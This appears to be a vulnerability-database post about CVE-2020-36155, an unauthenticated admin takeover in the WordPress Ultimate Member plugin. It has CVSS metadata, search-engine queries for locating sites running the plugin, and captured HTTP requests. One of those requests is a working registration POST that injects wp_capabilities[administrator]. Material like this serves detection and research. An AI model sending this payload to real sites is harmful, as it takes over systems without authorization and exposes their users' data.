---
layout: "post"
cve_id: "CVE-2020-36155"
title: "Ultimate Member < 2.1.12 - Unauthenticated Privilege Escalation via User Meta"
pcap: true
pcap_path: "/pcaps/2020/CVE-2020-36155.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2020/CVE-2020-36155.yaml"
author: "riteshs4hu"
severity: "critical"
impact: "Unauthenticated attackers can escalate privileges to administrator during registration, gaining complete control over the WordPress site and all user data.
"
remediation: "Fixed in 2.1.12"
reference:
  - "https://wpscan.com/vulnerability/cf13b0f8-5815-4d27-a276-5eff8985fc0b/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2020-36155"
  - "https://wordpress.org/plugins/ultimate-member/#developers"
classification: "{'cvss-metrics': 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H', 'cvss-score': 10, 'cve-id': 'CVE-2020-36155', 'cwe-id': 'CWE-269', 'epss-score': 0.61437, 'epss-percentile': 0.9825, 'cpe': 'cpe:2.3:a:ultimatemember:ultimate_member:*:*:*:*:*:wordpress:*:*'}"
metadata: "{'max-request': 3, 'verified': True, 'vendor': 'ultimatemember', 'product': 'ultimate_member', 'framework': 'wordpress', 'publicwww-query': '/wp-content/plugins/ultimate-member', 'fofa-query': 'body="/wp-content/plugins/ultimate-member"', 'shodan-query': 'http.html:/wp-content/plugins/ultimate-member/'}"
tags:
  - "cve"
  - "cve2020"
  - "wordpress"
  - "wp-plugin"
  - "wp"
  - "wpscan"
  - "ultimate-member"
  - "intrusive"
  - "privesc"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---

## ðŸ” Vulnerability Description
An issue was discovered in the Ultimate Member plugin before 2.1.12 for WordPress, aka Unauthenticated Privilege Escalation via User Meta. An attacker could supply an array parameter for sensitive metadata, such as the wp_capabilities user meta that defines a user's role. During the registration process, submitted registration details were passed to the update_profile function, and any metadata was accepted, e.g., wp_capabilities[administrator] for Administrator access.


## ðŸŒ HTTP Request
```nohighlight
GET /register/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /register HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0
Connection: close
Content-Length: 299
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

user_login-TzPxNZ=vwpxe&first_name-TzPxNZ=jfR0A&last_name-TzPxNZ=6HxfO&user_email-TzPxNZ=hPkBnd@BReCq.com&user_password-TzPxNZ=XHUOMJfF&confirm_user_password-TzPxNZ=XHUOMJfF&wp_capabilities%5Badministrator%5D=&form_id=TzPxNZ&timestamp=1768290050&um_request=&_wpnonce=VRWDxE&_wp_http_referer=register
```

```nohighlight
GET /wp-admin/users.php HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 14) AppleWebKit/620.32 (KHTML, like Gecko) Version/17.1.10 Safari/620.32
Connection: close
Accept-Encoding: gzip
```

